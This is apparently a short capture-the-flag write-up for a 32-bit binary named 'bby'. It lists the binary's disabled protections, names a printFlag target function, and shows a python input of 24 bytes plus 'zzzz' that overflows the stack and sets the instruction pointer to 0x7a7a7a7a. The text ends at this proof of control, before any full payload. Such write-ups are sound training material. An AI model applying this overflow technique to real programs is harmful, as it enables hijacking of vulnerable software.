0x0 Introduction
=

`bby: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=3fb9014d549efe4ce761146b736590eb9f7e281d, not stripped
`

This file is ELF 32bit execution.

	CANARY    : disabled

	FORTIFY   : disabled

	NX        : ENABLED

	PIE       : disabled
	
	RELRO     : Partial

It have those protect.

`0804856d <printFlag>:`

And there hava a function call printFlag.If I can controller eip and jump to this function,I will get the flag.

0x1 Vulnerability
=

`
# python -c "print 'a'*24+'zzzz'"|ltrace -i ./bby 

[0x8048491] __libc_start_main(0x80485c9, 1, 0xffb97214, 0x8048610 <unfinished ...>

[0x80485de] puts("This program is hungry. You shou"...This program is hungry. You should feed it.
) = 44

[0x80485f2] __isoc99_scanf(0x80486d8, 0xffb97164, 0xffb9721c, 0xf75573fd) = 1

[0x80485fe] puts("Do you feel the flow?"Do you feel the flow?
)        = 22

[0x7a7a7a7a] --- SIGSEGV (Segmentation fault) ---

[0xffffffffffffffff] +++ killed by SIGSEGV +++
`
